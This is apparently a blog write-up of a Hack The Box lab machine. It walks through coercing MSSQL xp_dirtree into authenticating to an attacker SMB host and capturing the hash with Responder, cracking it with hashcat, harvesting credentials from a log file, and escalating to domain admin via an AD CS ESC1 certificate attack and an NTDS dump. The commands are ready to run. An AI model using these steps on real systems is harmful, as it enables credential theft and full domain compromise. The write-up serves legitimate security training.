Capturing the MSSQL System Admin hash using Responder \u0026amp; xp_dirtree: I know that it\u0026rsquo;s possible to read files using xp_dirtree as I did this on the Manager box:\nhttps://bloodstiller.com/walkthroughs/manager-box/ I check if I can use xp_dirtree to read \u0026amp; list local files\nI cannot read files however my password is GuestUserCantWrite1 so lets see if we can write as I know it\u0026rsquo;s possible to host a malicious SMB server and request the DB instance attempt to connect so we can capture the MSSQL System Administrator Hash Just a note: impacket-mssqlclient.py has good tools built in already so you you can just run xp_dirtee \u0026lt;path\u0026gt; you do not have to use all args etc. I start Responder :\nsudo responder -v -I tun0 I use xp_dirtee to connect back to my malicious SMB server:\nexec master..xp_dirtree '\\\\10.10.14.38\\share\\' This is just \\\\\u0026lt;MYKALIIP\\FAKESHARE\u0026gt; Hash Caught:\nThis works as when we run the command using xp_dirtree it tries to connect \u0026amp; authorize to our malicious SMB server \u0026amp; Responder captures the hash: Overview of xp_dirtree: xp_dirtree is an extended stored procedure in Microsoft SQL Server.\nIt is used to list the directory structure (files and subdirectories) of a specified path on the server.\nCommand Injection Risk: Since it\u0026rsquo;s interacting with the OS, it can be a target for malicious input if not properly handled. (E.G. Getting it to connect to our malicious SMB server so we can capture hashes)\nUsing xp_dirtree:\nCalled using the syntax below:\nEXEC xp_dirtree 'path', depth, file_flag; Example: EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1; Example: EXEC xp_dirtree 'C:\\', 1, 1; Notes: Path Specified: C:\\ Lists the contents of the root of the C drive. Depth Level: 1: Indicates it will list files and directories in the first level of the C drive. This includes files directly in C:\\ and the first-level directories under C:\\. File Flag: 1: Specifies that both files and directories should be included in the output. Output: The result set will contain: All files located directly in C:\\. All first-level subdirectories (e.g., C:\\Program Files, C:\\Windows, etc.). +Note+: The command does not recursively list files in subdirectories beyond the first level due to the specified depth of 1~. If you want to see files in deeper levels, you can increase the depth parameter e.g. 2, 3 etc Cracking the MSSQL System Admin using Hashcat : I fire up hashcat and good ol\u0026rsquo; trusty rockyou\nhashcat -m 5600 mssqlhash ~/Wordlists/rockyou.txt Cracked!! In theory we should be able to authorize as this DBA, activate xp_cmdshell and get code execution on the underlying OS. I verify it\u0026rsquo;s valid:\nEnumerating SMB as sql_svc user: I check with netexec if the user can connect to SMB and they can, they have access to the SYSVOL share as well as the NETLOGON share.\nSYSVOL Share Enumeration:\nI use smbmap to enumerate the share but there is nothing of note: smbmap -u $user -p $pass -H $box -r SYSVOl NETLOGON Share Enumeration:\nsmbmap -u $user -p $pass -H $box -r NETLOGON SYSVOL Share: Part of the SYSVOL directory is shared as the SYSVOL share; this is critical for distributing files necessary for Group Policy \u0026amp; will often be used to hold scripts on a DC so this is a good target to go after. Running bloodhound.py: I use bloodhound.py to enumerate the domain with the creds I have. python3 bloodhound.py -dc dc.sequel.htb -c All -u $user -p $pass -d sequel.htb -ns $box Looking at the results our current user does not have that many privielges so I will continue to enumerate. Connecting to the MSSQL as sql_svc: I connect to the host as sql_svx:\nI try and enable xp_cmdshell but am unable to:\nFinding a linked SQL Instance: +Correction+: This is wrong, I later found it was just showing me my existing database, I have left it in as I believe it\u0026rsquo;s important and show these mistakes.\nI check if there are any linked remote SQL instances running:\nSELECT srvname, isremote FROM sysservers; We can also run the inbuilt command in impacket-mssql: enum_links I try and connect but I am unable to access the instance Enumerating the Host Using xp_dirtree: I check if am able to use xp_dirtree to list files on the host:\nBingo I list the users home folders and find a Ryan.Cooper:\nI add his name to my users. I try and list his home folder but don\u0026rsquo;t have perms:\nI enumerate further and find that there is an ERRORLOG.BAK *file stored in C:\\SQLServer\\Logs\\\nDownloading ERRORLOG.BAK \u0026amp; why it\u0026rsquo;s important to re-check your tools: I try and use the SINGLE_CLOB approach to read the file but don\u0026rsquo;t have the required permissions:\nSELECT * FROM OPENROWSET(BULK N'C:\\SQLServer\\Logs\\ERRORLOG.BAK', SINGLE_CLOB) AS Contents I try and create a new MSSQL database so I can then import the ERROLOG.BAK into it:\nCREATE DATABASE hacker; Denied again. Using evil-winrm to retrieve the ERRORLOG.BAK file:\nI try and connect with evil-winrm which I was convinced I did earlier \u0026amp; couldn\u0026rsquo;t but tried again anyway \u0026amp; could connect!!! Slap me with the idiot gun stick!!! +Note+: This is something I want to stress, it\u0026rsquo;s really important to re-check tools in situations like this sometimes you get false positives \u0026amp; false negatives. Reading ERRORLOG.BAK \u0026amp; finding credentials for Ryan.Cooper: I open the ERRORLOG.BAK in my text editor:\nI search for the string \u0026ldquo;password\u0026rdquo; \u0026amp; get a hit containing Ryan.Coopers password: I verify if the creds are still valid using netexec:\nnetexec smb $box -u $user -p $pass --shares 3. Privilege Escalation: Enumerating the host as Ryan.Cooper: In this section I am going to show EVERYTHING I do, obviously blogs are cultivated and don\u0026rsquo;t show every little thing, but I want to show all the tools I try to get root.\nI connect via evil-winrm \u0026amp; retrive the flag:\nAutomated Enumeration: I check bloodhound:\nBut there is no clear path here so we need to enumerate the host and the user further: I try and run secretsdump.py:\n+Note+: This may seem weird to do now, however I have had success retriveing creds this way and moving laterally. Running LaZagne.exe:\nWe get nothing, will have to try harder…offsec is that you? I run SessionGopher.ps1 to check for any other sessions:\nI run privesccheck.ps1:\nI do see that LSA is not protected: Stored Credentials Enumeration: Check for stored creds using cmdkey: cmdkey /list User Enumeration: I enumerate users: net user +Note+: The reason my user enumeration is not more extensive is due to the fact that Groups, Users \u0026amp; Hosts are enumerated via bloodhound. My main goal at the moment is to find out what is happening on this specific DC. Basic System Enumeration: I try and gather basic systeminfo but am denied: Installed Program Enumeration: I list all the installed programs by querying the registry keys using powershell: *Evil-WinRM* PS C:\u0026gt; (\u0026#39;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;, \u0026#39;HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, InstallLocation | Format-Table -AutoSize DisplayName DisplayVersion InstallLocation ----------- -------------- --------------- Microsoft SQL Server 2019 (64-bit) Microsoft SQL Server 2019 (64-bit) SQL Server 2019 Common Files 15.0.2000.5 Microsoft SQL Server 2019 Setup (English) 15.0.4013.40 SQL Server 2019 XEvent 15.0.2000.5 SQL Server 2019 XEvent 15.0.2000.5 SQL Server 2019 SQL Diagnostics 15.0.2000.5 Microsoft VSS Writer for SQL Server 2019 15.0.2000.5 Microsoft SQL Server 2019 T-SQL Language Service 15.0.2000.5 Microsoft SQL Server 2019 RsFx Driver 15.0.2000.5 SQL Server 2019 Common Files 15.0.2000.5 SQL Server 2019 Database Engine Shared 15.0.2000.5 SQL Server 2019 Shared Management Objects 15.0.2000.5 Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.29.30133 14.29.30133 SQL Server 2019 DMF 15.0.2000.5 Microsoft ODBC Driver 17 for SQL Server 17.7.2.1 SQL Server 2019 Shared Management Objects Extensions 15.0.2000.5 SQL Server 2019 Connection Info 15.0.2000.5 Microsoft OLE DB Driver for SQL Server 18.5.0.0 Microsoft SQL Server 2012 Native Client 11.4.7462.6 SQL Server 2019 Database Engine Services 15.0.2000.5 SQL Server 2019 Shared Management Objects 15.0.2000.5 SQL Server 2019 Shared Management Objects Extensions 15.0.2000.5 VMware Tools 12.0.6.20104755 C:\\Program Files\\VMware\\VMware Tools\\ SQL Server 2019 Batch Parser 15.0.2000.5 SQL Server 2019 Database Engine Shared 15.0.2000.5 SQL Server 2019 Database Engine Services 15.0.2000.5 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.29.30133 14.29.30133 SQL Server 2019 DMF 15.0.2000.5 SQL Server 2019 Connection Info 15.0.2000.5 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.29.30133 14.29.30133.0 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30133 14.29.30133.0 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133 14.29.30133 Browser for SQL Server 2019 15.0.2000.5 Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664 12.0.40664 Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40664 12.0.40664.0 Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664 12.0.40664 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133 14.29.30133 The only thing that looks interesting here is the VMWare install, however that could just be for the box to run. Path Enumeration: I enumerate the PATH: $Env:PATH I see that there is an installation of OpenSSH here: Drive Enumeration: I check for any other mounted drives: get-PSdrive What is interesting here is Cert, certificates can be used as a valid attack path. Scheduled Task Enumeration: I check for scheduled tasks: Get-ScheduledTask | select TaskName,State It is denied, however I can use schtasks, save the output and inspect later: schtasks /query /fo LIST /v \u0026gt; tasks.txt This provides ALOT of data, so we need to be smart with how we process it. At the moment I have kept it for later. Powershell History Enumeration: I try and check his powershell history file: Cat C:\\Users\\Ryan.Cooper\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt Get-ChildItem -Path \u0026quot;$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\u0026quot; | Format-Table -AutoSize Network Enumeration: I check to see if we are listening or presenting any interesting services:\nnetstat -nao Arp Table Enumeration:\narp -a There are some other hosts listed here, however as far as I am aware this is the only target for this engagement as it\u0026rsquo;s a single box, unless we are presenting different services on different nics \u0026amp; they have seperate IP\u0026rsquo;s. NIC enumeration:\nipconfig /all I check for additional NICS but there is nothing, so the entries in the arp table I imagine are part of HTB\u0026rsquo;s infrastructure. I check the routing table:\nroute print I attempt to enumerate network shares but I am denied:\nI check for VPN connections:\nrasdial Service/Process Enumeration: I attempt to list all processes running:\nI try with tasklist /svc \u0026amp; with wmic process list full but I am denied. I try and enumerate services using powershell:\nget-service It fails as I suspect, however we can also check services with evil-winrm. Listing running services using evil-winrm:\nThere are 3 services running with Privs, but 2 are Defender and the other is a standard windows component, so not hijackable as far as I am aware. Enumerating the password policy: Enumerating the password policy: net accounts Nothing of note Enumerating if the DC is vulnerable to any certificate privilege escalation techniques. I use certipy to check if the DC is vulnerable:\ncertipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box Reading the report it says the DC is vulnerable to the ESC1 attack path:\nUsing ESC1 Attack Chain to elevate privileges to Administrator: I retrieve the certificate template name from the file:\nI sync my clock:\nsudo ntpdate -s sequel.htb +Note+: If you see the below error this is most likely down to your attack host clock being too out of sync with the target. (Picture taken from a previous box where I learned the hard way) I request a cert:\ncertipy-ad req -username $user@$domain -password $pass -ca sequel-DC-CA -target ca.$domain -template UserAuthentication -upn administrator@$domain -dns dc.$domain +Note+: How we have used the name of the certificate we found in step 1 UserAuthentication +!!!SUCESS!!!+ I request to authenticate as the Administrator and retrieve the Administrator NT hash \u0026amp; creds stored in .ccache:\ncertipy-ad auth -pfx administrator_dc.pfx -dc-ip $box We have both the administrator hash as well as the creds stored in .ccache which we can use Kerberos authentication with. Attack Deep-Dive e.g Exploiting UPN\u0026rsquo;s in ESC1 Attacks: A Hackers Guide: What\u0026rsquo;s a UPN and Why Do We Care?\nFirst things first: UPN stands for User Principal Name (UPN). They\u0026rsquo;re commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here\u0026rsquo;s why they\u0026rsquo;re so important: They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension. They link certificates to specific Active Directory accounts. They enable certificate mapping for authentication. They facilitate Single Sign-On (SSO) scenarios. They\u0026rsquo;re used in smart card logons. Sometimes, they even correspond to email addresses. Now onto the attack:\nESC1 is one of the most fundamental certificate-based attack vectors in Active Directory environments. It occurs when a certificate template allows for client authentication and is configured with dangerous enrollment permissions. Here\u0026rsquo;s why it matters: It\u0026rsquo;s incredibly common in enterprise environments Often overlooked during security assessments Can lead to complete domain compromise (like in this case) Relatively simple to execute The ESC1 Attack: Your Gateway to Domain Admin Privileges:\nThe ESC1 attack path revolves around a misconfigured certificate template that grants excessive enrollment permissions. Here\u0026rsquo;s the breakdown: We discover a template that allows client authentication (like the User template) We notice that low-privileged users (like Domain Users) have enrollment rights We request a certificate using this template We can now authenticate to services that accept certificate-based authentication From Certificate to Domain Access:\nBut wait, you might ask, \u0026ldquo;How do we actually leverage this certificate for privilege escalation?\u0026rdquo; Great question! Here\u0026rsquo;s the step-by-step process: First, we identify vulnerable templates:\nLook for templates that allow client authentication Check if Domain Users can enroll Verify the template is enabled We request and obtain our certificate:\nUsing Certipy The certificate is valid and trusted within the domain Here\u0026rsquo;s where the magic happens:\nWe can now authenticate to services that accept certificate auth +Note+: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a .cacche file so we can then perform PTT attacks from the comfort of our attack box. Privilege escalation opportunities:\nAuthenticate as a the privielged user with their hash. Authentication to sensitive services Potential for further certificate template abuse Why This Attack Vector is Significant:\nWidespread Impact: Many organizations use default certificate templates Persistence: Certificates typically have long validity periods This one is valide for 99 years!!! Stealth Factor: Certificate-based authentication generates fewer logs Chain Reaction: Can be combined with other ESC attacks for greater impact Detection and Prevention:\nAudit certificate template permissions regularly Restrict enrollment rights to necessary users only Disable unused certificate templates Monitor certificate request patterns Implement proper template security settings Tools of the Trade:\nCertipy : Your Swiss Army knife for certificate attacks Certutil : Built-in Windows tool for certificate operations Remember: ESC1 might seem basic, but it\u0026rsquo;s often the first step in a more complex attack chain. Don\u0026rsquo;t underestimate its potential impact on your Active Directory security posture!\n4. Ownership: Dumping NTDS.dit database: Dumping NTDS for ownership: netexec smb $box -u $user -H $hash -M ntdsutil Loading .ccache into the KRB5CCNAME Variable to Authenticate: I load the .ccache into the KRB5CCNAME Variable:\nI check it\u0026rsquo;s valid:\nnetexec smb $box -u administrator --use-kcache --shares It is, we can now authenticate with kerberos. Lessons Learned: What did I learn? I hadn\u0026rsquo;t actually used the ESC1 attack vector before only ESC7 in https://bloodstiller.com/walkthroughs/manager-box/ , so it was cool to that. I learned about netexec displaying guest when a random username and password is supplied as a way to show that guest logon is accepted on the target. I learned to always re-check my tools. That mistake with evil-winrm was silly. What silly mistakes did I make? See point 3 above. Oh I also tried to use the wrong certificate name when initially doing the exploit, copy \u0026amp; paste always! Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",
